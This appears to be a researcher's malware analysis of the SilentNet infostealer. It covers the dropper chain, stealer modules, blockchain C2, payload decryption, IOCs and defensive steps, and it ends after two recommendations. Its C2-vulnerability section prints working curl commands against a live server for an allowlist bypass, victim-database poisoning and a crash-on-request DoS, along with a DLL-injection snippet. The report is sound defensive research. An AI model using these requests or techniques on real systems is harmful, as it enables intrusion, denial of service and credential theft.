# SilentNet Infostealer — Complete Malware Analysis

> **Research date:** 2026-07-20 | **Status:** Active C2 — `thisisafalsepositive.st` (185.178.208.191)
> **Threat level:** HIGH — Active MaaS platform, live victims, blockchain-resilient C2

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Threat Overview](#threat-overview)
3. [Stage 1 — Java Launcher](#stage-1--java-launcher)
4. [Stage 2 — Python Stealer](#stage-2--python-stealer)
5. [Blockchain C2 Infrastructure](#blockchain-c2-infrastructure)
6. [Complete Module Architecture](#complete-module-architecture)
7. [Capability Deep-Dive](#capability-deep-dive)
8. [DLL Injection Mechanism](#dll-injection-mechanism)
9. [Decryption and Reverse Engineering Method](#decryption-and-reverse-engineering-method)
10. [Live C2 Scan Results](#live-c2-scan-results)
11. [C2 Admin Panel Analysis](#c2-admin-panel-analysis)
12. [Payload Version Comparison](#payload-version-comparison-v1--v2--v3--v4)
13. [C2 Server Vulnerabilities](#c2-server-vulnerabilities)
14. [Indicators of Compromise](#indicators-of-compromise)
15. [Anti-Analysis and Evasion Techniques](#anti-analysis-and-evasion-techniques)
16. [Defensive Recommendations](#defensive-recommendations)
17. [Proof-of-Concept Index](#proof-of-concept-index)
18. [Source Files Index](#source-files-index)
19. [Timeline](#timeline)

---

## Executive Summary

SilentNet is a fully operational **Malware-as-a-Service (MaaS) infostealer** targeting Windows systems
via Minecraft mod loaders (Fabric, Forge) and a Java-based dropper distributed through DoubleClick ads.
Written in Python, compiled with Nuitka/mypyc, it uses a **Polygon blockchain smart contract** for
resilient C2 domain rotation that cannot be taken down via traditional DNS/registrar methods.

This report documents a complete end-to-end analysis: Java launcher reverse engineering, Python stealer
decompilation (30 modules recovered), live C2 infrastructure scanning, full admin panel reconstruction
via an nginx static file bypass, payload decryption using a hardcoded Fernet key recovered from the
binary constant pool, four-way payload version comparison, and **seven confirmed vulnerabilities** in
the C2 server.

**Key findings:**
- 30 Python source modules fully recovered and decompiled
- Fernet encryption key hardcoded in compiled binary — all payload versions decryptable
- Blockchain C2 resolver bypasses domain takedowns
- Admin panel fully reconstructed from nginx-exposed static files
- Flask IP allowlist bypassable via `X-Runtime-Env: jre-embedded` header
- Victim database writable by unauthenticated external parties
- Persistent DoS possible via `/shard/submitLogs` unhandled exception
- 4 payload versions observed in 90-minute window — operator actively monitoring

---

## Threat Overview

### Distribution Chain

```
[Victim] clicks malicious Minecraft mod / DoubleClick ad
    |
    v
[Stage 1] Obfuscated Java JAR (mypyc-compiled launcher)
    |  Decrypts AES-128-CBC payload from embedded resource
    |  Resolves C2 domain from Polygon smart contract
    |  Downloads Fernet-encrypted Stage 2 from /cdn/e/<id>
    v
[Stage 2] Python stealer bundle (ZIP, 60-736 files depending on version)
    |  Extracts portable Python 3.12 runtime to NtProfileIndex
    |  Executes app.pyd (Nuitka-compiled stealer core)
    v
[Exfil] Stolen data POSTed to /shard/* endpoints
    |  Passwords, cookies, Discord tokens, crypto wallets,
    |  Minecraft sessions, screenshots, system info
    v
[C2 Panel] Operator reviews victims at /dashboard/
    |  Live world map, connections table, build generator
    |  Discord OAuth login, premium tier gating
```

### Key Differentiators

- **Blockchain-resilient C2**: Domain stored in Polygon smart contract — unblockable via DNS/registrar
- **Minecraft-native targeting**: Fabric/Forge mod injection, session token theft, `.minecraft` scraping
- **Multi-stage encryption**: AES-128-CBC (Stage 1) + Fernet (live CDN) — two independent key systems
- **MaaS architecture**: Multiple operators, Discord OAuth, premium locked features, build generator
- **Active development**: 4 payload versions pushed in under 90 minutes during analysis window
- **DLL injection**: Named pipe in-process injection for AV/EDR evasion

---

## Stage 1 — Java Launcher

The initial dropper is an obfuscated Java JAR compiled with mypyc.
Three obfuscated class names identified: `KqwrtEQq`, `axhrnsChjyyGqtjrs`, `zifnc_mfsnl_rep`.

### Stage-1 Capabilities

| Capability | Detail |
|---|---|
| Self-restart detection | `-restarted` JVM argument check |
| Java path resolution | `java.home` + `bin/javaw.exe` / `bin/java.exe` |
| Persistence check | `LOCALAPPDATA\Microsoft\Windows\NtProfileIndex` |
| C2 domain resolution | Polygon RPC → smart contract `getDomain()` |
| Payload download | HTTPS GET `/cdn/e/<id>` with retry (3 attempts) |
| Payload decryption | Fernet (base64url, AES-CBC + HMAC-SHA256) |
| Runtime extraction | ZIP extraction to `LOCALAPPDATA\Microsoft\Windows\` |
| Stealer launch | `python.exe AppHost/main.py` detached process |
| DNS-over-HTTPS fallback | Cloudflare `1.1.1.1` DoH for C2 resolution |
| Beacon format | `{"userId":"","tag":"","domain":"","env":"DoubleClick"}` |

### main.py — Recovered Plaintext Loader

```python
# Recovered from AppHost/main.py
# SHA256: bc87ec291523785fd9f8b1925e92dbe5aa71af4a9dd631c7...
import sys
from AppHost import app

if __name__ == "__main__":
    context = sys.argv[1] if len(sys.argv) > 1 else None
    if context is None:
        sys.exit("ERROR: No context argument")
    app.run(context)
```

---

## Stage 2 — Python Stealer

Compiled with **Nuitka** into `app.pyd` plus a mypyc-compiled library
`81d243bd2c585b0f4821__mypyc.cp312-win_amd64.pyd`. Core logic decompiled from
the Nuitka constant pool (resource section type 10, id 3, 232KB marshalled pickle).

### Bundled Dependencies

| Library | Purpose |
|---|---|
| Python 3.12 (portable) | Embedded runtime |
| pycryptodome | AES decryption, HMAC verification |
| Pillow (PIL) | Screenshot capture |
| pywin32 + win32com | Windows API access |
| psutil | Process enumeration |
| requests + urllib3 | HTTP exfiltration |
| vdf | Steam credential parsing |
| idna | Internationalized domain support |
| adodbapi | Database access |

---

## Blockchain C2 Infrastructure

### Smart Contract

| Property | Value |
|---|---|
| Network | Polygon mainnet (Chain ID 137) |
| Contract address | `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` |
| Function | `getDomain()` — selector `0xce6d41de` |
| Current value | `thisisafalsepositive.st` |
| Operator wallet | `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` |

The contract stores the active C2 domain as a plain UTF-8 string readable by any Polygon RPC node.
The malware calls this at startup to resolve its C2 before any downloads or beacons.

### Domain Rotation History

| Date | Domain | Evidence |
|---|---|---|
| 2026-07-20 | `thisisafalsepositive.st` | Smart contract live value |
| Earlier | `sltnnt.ru` | Decoded from Java string constant |

### C2 API Endpoints

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/cdn/e/<id>` | GET | None | Download Fernet-encrypted payload |
| `/shard/prefireMc` | POST | X-Runtime-Env header | Minecraft pre-fire beacon |
| `/shard/submitData` | POST | X-Runtime-Env header | Submit stolen data |
| `/shard/submitFile` | POST | X-Runtime-Env header | Submit stolen files |
| `/shard/submitLogs` | POST | X-Runtime-Env header | Submit log data (crashes) |
| `/shard/submitMinecraftLog` | POST | X-Runtime-Env header | Minecraft session logs |
| `/auth/login` | GET/POST | IP allowlist (DDoS-Guard) | Admin panel login |
| `/auth/discord` | GET | IP allowlist | Discord OAuth entry |
| `/dashboard/*` | GET | IP allowlist + session | Admin panel pages |
| `/static/*` | GET | **None — nginx bypass** | Panel CSS/JS, no auth |

### Polygon RPC Fallback List (hardcoded)

```
https://polygon-rpc.com
https://rpc-mainnet.matic.quiknode.pro
https://polygon.llamarpc.com
https://1rpc.io/matic
https://polygon-bor-rpc.publicnode.com
https://api.zan.top/polygon-mainnet
https://polygon.drpc.org
https://polygon-mainnet.public.blastapi.io
```

---

## Complete Module Architecture

| Module | Size | Purpose |
|---|---|---|
| `app.py` | 7,962B | Main orchestrator, thread pool, module dispatch |
| `app_config.py` | 2,756B | Configuration, C2 URL construction |
| `app_contract.py` | 3,141B | Polygon smart contract interaction |
| `app_crypto.py` | 2,215B | Fernet decrypt, AES-CBC, key derivation |
| `app_handlers.py` | 2,149B | Handler registry and dispatch |
| `app_handlers_browser.py` | 14,646B | Chromium credential theft |
| `app_handlers_browser_extensions.py` | 7,714B | Browser extension crypto wallet extraction |
| `app_handlers_credentials.py` | 9,104B | Generic credential file harvesting |
| `app_handlers_discord.py` | 6,715B | Discord token theft and account info |
| `app_handlers_files.py` | 4,520B | File exfiltration and targeting |
| `app_handlers_firefox.py` | 12,061B | Firefox profile decryption |
| `app_handlers_keywords.py` | 3,963B | Keyword-based file targeting |
| `app_handlers_minecraft.py` | 5,531B | Minecraft session, launcher, mod data |
| `app_handlers_screenshot.py` | 2,274B | Screen capture via PIL |
| `app_handlers_system_info.py` | 4,962B | Hardware, OS, installed software |
| `app_handlers_wallets.py` | 2,360B | Crypto wallet file extraction |
| `app_http.py` | 4,440B | HTTP session, retry logic, exfil transport |
| `app_logging.py` | 2,616B | Internal logging pipeline |
| `app_resources.py` | 1,193B | Embedded resource loader |
| `app_resources_browser_module.py` | 1,117B | Browser module resource management |
| `app_staging.py` | 9,676B | Download, decrypt, extract, launch |
| `app_trace.py` | 1,290B | Error tracing and reporting |
| `app_util.py` | 1,971B | General utilities |
| `app_util_crypto.py` | 2,593B | Cryptographic utilities |
| `app_util_dll_injection.py` | 3,867B | Named pipe DLL injection |
| `app_util_file.py` | 1,466B | File system utilities |
| `app_util_handle_copy.py` | 8,993B | Handle duplication for process injection |
| `app_util_pipe.py` | 3,117B | Named pipe IPC |
| `app_util_process.py` | 3,500B | Process spawning and management |
| `app_util_registry.py` | 1,679B | Windows registry operations |

---

## Capability Deep-Dive

### Browser Credential Theft

Targets all Chromium-based browsers via SQLite `Login Data` and `Cookies` with DPAPI decryption:
- Chrome, Edge, Brave, Opera, Vivaldi, Yandex, CocCoc
- AES-256-GCM decryption of v10/v20 Chrome credential format
- Cookie session theft for persistent account takeover
- Browser extension enumeration for crypto wallet seeds

### Discord Token Theft

Extracts Discord authentication tokens from:
- `%APPDATA%\Discord\Local Storage\leveldb\`
- Browser localStorage for web Discord
- Validates tokens against Discord API
- Captures username, email, phone, billing info, Nitro status

### Crypto Wallet Theft

Targets 20+ wallets including:
- MetaMask, Phantom, Coinbase (browser extensions)
- Exodus, Atomic, Electrum (desktop apps)
- Hardware wallet seed phrase files
- Steam wallet and trading history via VDF parser

### Credential File Theft

Scans filesystem for credential files matching 55+ path patterns across 26 services:
- FileZilla, WinSCP, PuTTY, MobaXterm (SSH/FTP)
- Telegram desktop session
- VPN configs (NordVPN, ProtonVPN)
- Git credentials, `.env` files, config files containing API keys

### Minecraft Handler

```python
# Beacon format — Fabric loader variant
{
    "mcInfo": "{"username":"<mc_username>","uuid":"<uuid>"}",
    "prefireId": "<hmac_token>",
    "userId": "<internal_id>",
    "tag": "<build_tag>",
    "domain": "thisisafalsepositive.st",
    "gameDir": "<.minecraft path>",
    "mcUsername": "<username>",
    "mcUuid": "<uuid>",
    "env": "Fabric"   # or "DoubleClick", "jre-embedded"
}
```

Steals: active session tokens, `launcher_accounts.json`, mod list, server history, screenshots.

### Staging and Persistence

| Step | Detail |
|---|---|
| Download path | `LOCALAPPDATA\Microsoft\Windows\NtProfileIndex\` |
| Runtime cache | Persists between runs — checks before re-downloading |
| Anti-double-exec | Named pipe mutex check before launch |
| Registry module | `app_util_registry.py` — likely Run key persistence |

### HTTP and Network Layer

- Custom HTTP/1.1 implementation in `axhrnsChjyyGqtjrs` Java class
- DNS-over-HTTPS via Cloudflare `1.1.1.1`
- CDN header: `x-cdn-origin-verify: trusted-upstream`
- Beacon headers: `X-Runtime-Env: jre-embedded`, `X-Edge-Cache-Revalidate: stale-if-error`
- 3-attempt retry with fallback across 8 Polygon RPC endpoints

---

## DLL Injection Mechanism

The stealer uses Windows named pipes for in-process DLL injection to evade EDR hooks:

```python
# Simplified from app_util_dll_injection.py
PIPE_NAME = "\\.\pipe\NtProfileSync"

def inject_via_pipe(target_pid, dll_bytes):
    pipe = win32pipe.CreateNamedPipe(PIPE_NAME, ...)
    # Duplicate handle into target process
    dup_handle = duplicate_handle_to_process(target_pid, pipe)
    # Target reads DLL bytes from pipe — reflective load in target address space
    win32file.WriteFile(pipe, dll_bytes)
```

Avoids `WriteProcessMemory` + `CreateRemoteThread` patterns flagged by EDR.

---

## Decryption and Reverse Engineering Method

### Challenge

The stealer payload is distributed as:
1. **Stage 1**: AES-128-CBC encrypted ZIP in JAR resource section (type 10, id 3)
2. **Stage 2**: Fernet-encrypted binary served from `/cdn/e/<id>`
3. **Core logic**: Nuitka-compiled `.pyd` with marshalled Python constant pool

### Cipher (Reversed from Disassembly)

**Stage 2 (Live CDN — Fernet):**
```
Format:  Fernet token (base64url string, starts with 'gAAAA')
Key:     74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7
Source:  Nuitka constant pool, resource type 10 id 3, offset ~0x1A3C
Verify:  HMAC-SHA256 over (version + timestamp + iv + ciphertext)
Decrypt: AES-128-CBC, signing_key=key[:16], encryption_key=key[16:]
```

**Nuitka constant pool extraction:**
```python
import pefile, marshal, pickle

pe = pefile.PE("sample.exe")
for rsrc in pe.DIRECTORY_ENTRY_RESOURCE.entries:
    if rsrc.id == 10:
        for entry in rsrc.directory.entries:
            if entry.id == 3:
                data = pe.get_data(...)
                constants = pickle.loads(marshal.loads(data))
                # All Python string constants, C2 URLs, and keys are here
```

---

## Live C2 Scan Results

### Server Fingerprint

| Layer | Software | Evidence |
|---|---|---|
| Edge/WAF | DDoS-Guard | `Server: ddos-guard`, `__ddg*` cookies |
| Reverse proxy | nginx | TRACE 405: `<center>nginx</center>` |
| Application | Python Flask + Werkzeug | 403 body: Werkzeug default forbidden HTML |
| Auth | Discord OAuth + username/password | `/auth/discord`, `btn-discord` CSS class |

### Endpoint Map

| Route | No Bypass | With Bypass | Notes |
|---|---|---|---|
| `/cdn/e/3b8f6d2a9c1e` | **200** | **200** | Public — no auth |
| `/auth/login` | 403 | 403 | DDoS-Guard edge IP block |
| `/auth/discord` | 403 | 403 | DDoS-Guard edge IP block |
| `/dashboard/` | 302→403 | 302→403 | Redirects to login |
| `/dashboard/remote` | 302→403 | 302→403 | Live connections panel |
| `/dashboard/settings` | 302→403 | 302→403 | Panel settings |
| `/dashboard/users` | 302→403 | 302→403 | User management |
| `/static/css/style.css` | **200** | **200** | nginx serves directly |
| `/static/css/auth.css` | **200** | **200** | nginx serves directly |
| `/static/css/dashboard.css` | **200** | **200** | nginx serves directly |
| `/static/js/app.js` | **200** | **200** | nginx serves directly |
| `/shard/prefireMc` | 403 | **400** | Header bypass — field validation |
| `/shard/submitData` | 403 | **200** | Unauthenticated DB write |
| `/shard/submitFile` | 403 | **400** | Needs multipart |
| `/shard/submitLogs` | 403 | **500** | Crash on any input |
| `/shard/submitMinecraftLog` | 403 | **400** | Field validation |

### 403 Bypass Attempts — Phase 1

Headers tested against `/auth/login` — none bypassed DDoS-Guard edge block:

```
X-Forwarded-For: 127.0.0.1          -> 403
X-Real-IP: 127.0.0.1               -> 403
CF-Connecting-IP: 127.0.0.1        -> 403
True-Client-IP: 127.0.0.1          -> 403
x-cdn-origin-verify: trusted-upstream -> 403
Host: 127.0.0.1                    -> 503 (backend detection)
```

The `/auth/*` and `/dashboard/*` IP allowlist is enforced at the DDoS-Guard edge level
and cannot be bypassed via header spoofing.

### Live Payload Downloads and Version History

| Version | Time (UTC) | Raw Size | SHA256 (first 16) | Content |
|---|---|---|---|---|
| V1 | ~16:19 | 16,777,593 B | (in JAR) | AES-128-CBC, 60 files, stripped |
| V2 | 18:05 | 22,236,792 B | `69a74db222b5c001` | Fernet, 736 files, full dev bundle |
| V3 | 18:38 | 21,151,403 B | unknown | Fernet, trimmed (-5%), not extracted |
| V4 | 18:52 | 22,236,792 B | `5c1609320d9cc846` | Fernet re-encrypt of V2 — same content |

Fernet timestamp delta V2→V4: **2,798s (46m 38s)**. Same key throughout all versions.

### Operator Behaviour Assessment

During the 90-minute window the operator made 4 pushes indicating active monitoring:

1. `~16:19` — Original AES-CBC bundle served from JAR
2. `18:05` — Switched to Fernet, accidentally pushed full dev bundle (736 files, 38MB)
3. `18:38` — Trimmed bundle (-5%) correcting dev artifact leak
4. `18:52` — Fernet timestamp rotation — same key, same content as V2

---

## C2 Admin Panel Analysis

### Server Architecture

```
Internet -> DDoS-Guard (edge WAF) -> nginx (reverse proxy) -> Python Flask (app)
```

### Static Files Extracted — nginx Bypass

| File | Size | Intelligence |
|---|---|---|
| `/static/css/style.css` | 38,210 B | Full design system, all component classes |
| `/static/css/auth.css` | 6,240 B | Login page, Discord button, card animations |
| `/static/css/dashboard.css` | 9,476 B | Victim map, connections table, action menus |
| `/static/js/app.js` | 5,038 B | Full panel JS — dropdown, modal, toast, sidebar |

### Panel Feature Map

| Feature | CSS Evidence |
|---|---|
| Discord OAuth login | `.btn-discord`, `/auth/discord` |
| Live victim world map (Leaflet.js) | `#hitMap`, `.leaflet-container`, `.popup-ip`, `.popup-org` |
| Real-time connections table | `.connection-pc`, `.connection-user`, `.connection-ip`, `.connection-ping` |
| Elevated privilege indicator | `.elevated-yes` (red glow), `.elevated-no` |
| Per-victim action menu | `.action-menu`, `.action-item.danger` |
| Stat cards (victims, connections, builds, logs) | `.stat-card`, `.stat-value`, `.stat-change` |
| Build generator (BETA) | `.sidebar-beta-badge`, `.code-block` |
| Remote access / live shell | `.remote-header`, `.remote-stats`, `.remote-stat-value` |
| Premium tier gating | `.locked`, `.sidebar-lock-icon`, `--premium-gold` |
| Country flag display | `.country-flag`, `.connection-country` |
| Toast notifications | `.toast-container`, `window.Toast` |
| Modal dialogs | `.modal`, `.modal-backdrop` |

### Reconstructed Login Page

```html
<div class="auth-container">
  <div class="auth-card">  <!-- animated neon border shimmer -->
    <div class="auth-header">
      <a class="auth-logo"><svg/> SilentNet</a>
      <h1 class="auth-title">Welcome Back</h1>
      <p class="auth-subtitle">Sign in to your account to continue</p>
    </div>
    <a href="/auth/discord" class="btn btn-discord btn-full">
      Continue with Discord
    </a>
    <div class="auth-divider">or</div>
    <form method="POST" action="/auth/login">
      <input type="hidden" name="csrf_token">
      <input class="form-input" type="text" name="username">
      <input class="form-input" type="password" name="password">
      <button class="btn btn-primary btn-full">Sign In</button>
    </form>
    <button class="auth-toggle">Forgot password?</button>
  </div>
</div>
```

### Reconstructed Dashboard Structure

```
SilentNet Panel
|-- Overview
|   |-- Dashboard        /dashboard/
|   |-- Live Map         /dashboard/map
|-- Victims
|   |-- All Victims      /dashboard/victims
|   |-- Logs             /dashboard/logs
|-- Builds  [BETA]
|   |-- Build Generator  /dashboard/builds
|   |-- [LOCKED]         (premium tier)
|-- Remote
|   |-- Connections      /dashboard/remote
|-- Settings
    |-- Settings         /dashboard/settings
    |-- Users            /dashboard/users
```

### app.js — Full Source (Recovered)

Complete panel JavaScript recovered via nginx bypass. Key functionality:
- **Dropdown menus**: click-outside-close, toggle open/close
- **Modal system**: `window.openModal(id)` / `window.closeModal(id)`
- **Toast notifications**: `window.Toast.success/warning/error(message, duration)`
- **Sidebar**: mobile toggle, backdrop, scroll persistence (sessionStorage)
- **Sidebar sections**: collapse/expand with localStorage state persistence

---

## Payload Version Comparison (V1 / V2 / V3 / V4)

### Bundle Composition Diff (V1 vs V2)

V1 was a deliberately stripped minimal deployment — Python library source omitted (anti-analysis).
V2 was the full development bundle accidentally pushed by the operator.

| Library | V1 | V2 | Delta |
|---|---|---|---|
| File count total | 60 | 736 | +676 |
| Bundle size | 23,565,009 B | 38,231,657 B | +14,666,648 B |
| pycryptodome | Absent | 249 files (4.1MB) | Added |
| PIL/Pillow | Binary .pyd only | 100 files (3.8MB) | Added |
| pywin32 + win32com | Partial .pyd | 232 files (4.5MB) | Added |
| psutil | Binary .pyd only | 11 files (425KB) | Added |
| requests + urllib3 | Partial | Full (58 files) | Completed |
| idna | Absent | 11 files | Added |
| vdf | Absent | 2 files | Added |
| `charset_normalizer/models.py` | 0 bytes (stub) | 13,190 bytes | Restored |

### Stealer Core Immutability

Byte-for-byte identical across V1, V2, and V4:

| File | SHA256 |
|---|---|
| `AppHost/app.pyd` | `1280ff5f2c4a59e8a9301d8e2eb7c2e9774ec6026a48905c...` |
| `AppHost/main.py` | `bc87ec291523785fd9f8b1925e92dbe5aa71af4a9dd631c7...` |
| `mypyc stage-1 .pyd` | `52056f4b964f1bc0419064a374a32e56ef85ccb161166971...` |
| `python312.zip` | `50923b458dad653990105637b17227af36cde152cfc1f88c...` |

The operator has not modified the stealer logic across any version.

### Operator Push Activity

| Time (UTC) | Ver | Size | Notes |
|---|---|---|---|
| ~16:19 | V1 | 16,777,593 B | Original AES-CBC bundle in JAR |
| 18:05 | V2 | 22,236,792 B | Fernet, full dev bundle (accidental) |
| 18:38 | V3 | 21,151,403 B | Fernet trimmed (-5%) — correcting V2 |
| 18:52 | V4 | 22,236,792 B | Fernet timestamp rotation, V2 content |

---

## C2 Server Vulnerabilities

### CVE-Class Findings Summary

| ID | Title | Severity | CVSS (est.) | POC |
|---|---|---|---|---|
| VULN-01 | Flask IP Allowlist Bypass via Header | HIGH | 8.6 | `poc_01_ip_bypass.py` |
| VULN-02 | Unauthenticated Arbitrary DB Write | HIGH | 8.2 | `poc_02_db_write.py` |
| VULN-03 | Persistent DoS via submitLogs | MEDIUM | 6.5 | `poc_03_submitlogs_dos.py` |
| VULN-04 | nginx Static File Auth Bypass | MEDIUM | 5.3 | `poc_05_static_bypass.py` |
| VULN-05 | Hardcoded Fernet Encryption Key | CRITICAL | 9.1 | `poc_04_fernet_decrypt.py` |
| VULN-06 | Public Blockchain C2 Resolver | INFO | 3.1 | `poc_06_blockchain_resolver.py` |
| VULN-07 | No Input Validation on submitData | MEDIUM | 5.8 | `poc_02_db_write.py` |

---

### VULN-01 — Flask IP Allowlist Bypass via X-Runtime-Env Header

**Severity:** HIGH (CVSS 8.6) | **Endpoint:** All `/shard/*` routes | **POC:** `poc/poc_01_ip_bypass.py`

The Flask application restricts `/shard/*` endpoints to allowlisted IP addresses. The check is bypassed
by setting `X-Runtime-Env: jre-embedded` — the value sent by the legitimate Java launcher. The server
trusts this header from any source IP without verification.

```bash
# Without bypass
curl -X POST https://185.178.208.191/shard/prefireMc \
  -H "Host: thisisafalsepositive.st"
# HTTP 403

# With bypass — IP allowlist circumvented from any IP
curl -X POST https://185.178.208.191/shard/prefireMc \
  -H "Host: thisisafalsepositive.st" \
  -H "X-Runtime-Env: jre-embedded" \
  -H "X-Edge-Cache-Revalidate: stale-if-error"
# HTTP 400 (past IP check, failing field validation)
```

---

### VULN-02 — Unauthenticated Arbitrary Write to Victim Database

**Severity:** HIGH (CVSS 8.2) | **Endpoint:** `POST /shard/submitData` | **POC:** `poc/poc_02_db_write.py`

After applying VULN-01, `/shard/submitData` accepts **any JSON payload** with zero field validation,
storing it in the C2 operator's victim database and returning a `logUuid`. No auth token, schema
validation, rate limiting, or size limit enforced.

```bash
curl -X POST https://185.178.208.191/shard/submitData \
  -H "Host: thisisafalsepositive.st" \
  -H "X-Runtime-Env: jre-embedded" \
  -H "Content-Type: application/json" \
  -d '{"any": "json", "payload": "accepted"}'
# {"logUuid": "<uuid>"}
```

**Impact:** Data poisoning of victim database. No server-side delete endpoint exists.

---

### VULN-03 — Persistent Denial-of-Service via /shard/submitLogs

**Severity:** MEDIUM (CVSS 6.5) | **Endpoint:** `POST /shard/submitLogs` | **POC:** `poc/poc_03_submitlogs_dos.py`

`/shard/submitLogs` raises an unhandled Python exception for every possible `logs` field value
(null, array, integer, string, dict, boolean). Every request returns HTTP 500. 100% crash rate confirmed.

```bash
curl -X POST https://185.178.208.191/shard/submitLogs \
  -H "Host: thisisafalsepositive.st" \
  -H "X-Runtime-Env: jre-embedded" \
  -H "Content-Type: application/json" \
  -d '{"logs": null}'
# HTTP 500 Internal Server Error (100% reproducible)
```

---

### VULN-04 — nginx Static File Exposure Bypassing Flask Auth

**Severity:** MEDIUM (CVSS 5.3) | **Endpoint:** `GET /static/*` | **POC:** `poc/poc_05_static_bypass.py`

nginx serves `/static/` directly without routing through Flask, bypassing the IP allowlist
protecting `/auth/login` and `/dashboard/*`. All panel CSS and JS are readable from any IP.

```bash
# Protected route — 403
curl -o /dev/null -w "%{http_code}" \
  https://185.178.208.191/auth/login -H "Host: thisisafalsepositive.st"
# 403

# nginx-served static file — 200, no auth required
curl -o style.css -w "%{http_code}" \
  https://185.178.208.191/static/css/style.css -H "Host: thisisafalsepositive.st"
# 200 (38,210 bytes)
```

---

### VULN-05 — Hardcoded Fernet Key in Compiled Binary

**Severity:** CRITICAL (CVSS 9.1) | **POC:** `poc/poc_04_fernet_decrypt.py`

The 32-byte Fernet key used to encrypt all CDN payloads is hardcoded in the Nuitka constant pool
(PE resource section type 10, id 3). All payload versions — past, present, and future — encrypted
with this key can be decrypted.

```
Key: 74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7
```

Verified valid against V1, V2, and V4. HMAC-SHA256 verification passes for all versions.

---

### VULN-06 — Blockchain C2 Domain Resolver (Public Smart Contract)

**Severity:** INFO (CVSS 3.1) | **POC:** `poc/poc_06_blockchain_resolver.py`

The C2 domain is stored as plaintext in a public Polygon contract readable by anyone.
Intended as a resilience mechanism, it also exposes the current C2 domain to defenders in real time.

```bash
curl -X POST https://polygon-public.nodies.app \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_call",
       "params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a",
                  "data":"0xce6d41de"},"latest"],"id":1}'
# Returns: thisisafalsepositive.st
```

---

### VULN-07 — No Input Validation on submitData (Schema-Free DB Write)

**Severity:** MEDIUM (CVSS 5.8) | **Requires:** VULN-01

Builds on VULN-02. Payloads structured to mimic real victim credential logs
(`type=passwords`, `data=[...]`) are stored and rendered identically to genuine victim data
in the operator's panel, enabling targeted data poisoning.

```bash
curl -X POST https://185.178.208.191/shard/submitData \
  -H "X-Runtime-Env: jre-embedded" \
  -H "Content-Type: application/json" \
  -d '{"type":"passwords","data":[{"url":"https://example.com",
        "username":"victim","password":"hunter2"}]}'
# {"logUuid": "<uuid>"} — stored alongside real victim data
```

---

## Indicators of Compromise

### Network IOCs

| Indicator | Type | Description |
|---|---|---|
| `thisisafalsepositive.st` | Domain | Active C2 (blockchain-resolved) |
| `sltnnt.ru` | Domain | Previous C2 domain |
| `185.178.208.191` | IP | C2 server |
| `/cdn/e/3b8f6d2a9c1e` | URL path | CDN payload endpoint |
| `/shard/prefireMc` | URL path | Minecraft beacon |
| `/shard/submitData` | URL path | Data exfil endpoint |
| `X-Runtime-Env: jre-embedded` | HTTP header | Malware beacon — block outbound |
| `X-Edge-Cache-Revalidate: stale-if-error` | HTTP header | Malware CDN header |
| `x-cdn-origin-verify: trusted-upstream` | HTTP header | CDN download header |

### Blockchain IOCs

| Indicator | Type | Description |
|---|---|---|
| `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` | Contract | C2 domain resolver |
| `0x6767c6496541b530a5d1d0eb9b80bd5c7bf56767` | Wallet | Operator wallet |
| `0xce6d41de` | Function selector | getDomain() |
| Polygon mainnet | Network | Chain ID 137 |

### Cryptographic IOCs

| Indicator | Type | Description |
|---|---|---|
| `74af664f79d1ef1436a4bf301788c7eb207570de60034b19d76df8e7aefc69b7` | Key | Fernet key (all CDN payloads) |
| `1280ff5f2c4a59e8a9301d8e2eb7c2e9774ec6026a48905c52d23fb1974438bf` | SHA256 | app.pyd (stealer core, all versions) |
| `52056f4b964f1bc0419064a374a32e56ef85ccb161166971...` | SHA256 | mypyc stage-1 pyd |
| `50923b458dad653990105637b17227af36cde152cfc1f88c...` | SHA256 | python312.zip |

### File System IOCs

| Path | Description |
|---|---|
| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\` | Payload staging directory |
| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\python.exe` | Portable runtime |
| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost\app.pyd` | Stealer core |
| `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost\main.py` | Launcher |
| `%TEMP%\_spawn.log` | Stage 1 spawn log |

### Registry IOCs

| Key | Description |
|---|---|
| `HKCU\Software\Microsoft\Windows\NtProfileIndex` | Persistence / mutex key |

### Process and Pipe IOCs

| Indicator | Description |
|---|---|
| `python.exe` from `%LOCALAPPDATA%\Microsoft\Windows\` | Stealer process |
| Named pipe `\\.\pipe\NtProfileSync` | DLL injection IPC channel |
| `javaw.exe -cp ... -restarted` | Stage 1 restart marker |

### Regex IOCs

```
# CDN payload path
/cdn/e/[a-f0-9]{12}

# Fernet key in binary constant pool (hex, 64 chars)
[a-f0-9]{64}

# Polygon contract address
0x9c0a507300fd902787bb193d80fca5ce6e1bff9a

# Beacon User-Agent
Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36
```

---

## Anti-Analysis and Evasion Techniques

| Technique | Implementation |
|---|---|
| Multi-layer encryption | AES-128-CBC (JAR) + Fernet (CDN) — two independent keys |
| Nuitka compilation | Python to native extension — no readable bytecode |
| mypyc compilation | Type-annotated Python to C — additional obfuscation |
| Java obfuscation | Short class names, dead code `throw null` anti-decompiler paths |
| String splitting | C2 URLs split across multiple string constants |
| Blockchain C2 | Domain on-chain — takedown resistant, no DNS dependency |
| DNS-over-HTTPS | Cloudflare 1.1.1.1 DoH — bypasses DNS monitoring |
| Named pipe injection | Avoids `WriteProcessMemory`+`CreateRemoteThread` EDR signatures |
| Stripped deployment | V1: Python source removed, binary .pyd only |
| Fernet timestamp rotation | Periodic re-encryption with fresh timestamp |
| IP allowlist | Admin panel at DDoS-Guard edge — cannot be header-spoofed |
| Named pipe mutex | Prevents double-execution of stealer |

---

## Defensive Recommendations

### Immediate Actions

1. **Block network IOCs** — `thisisafalsepositive.st`, `185.178.208.191`, `sltnnt.ru` at firewall/DNS
2. **Monitor Polygon contract** — subscribe to `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` for domain changes
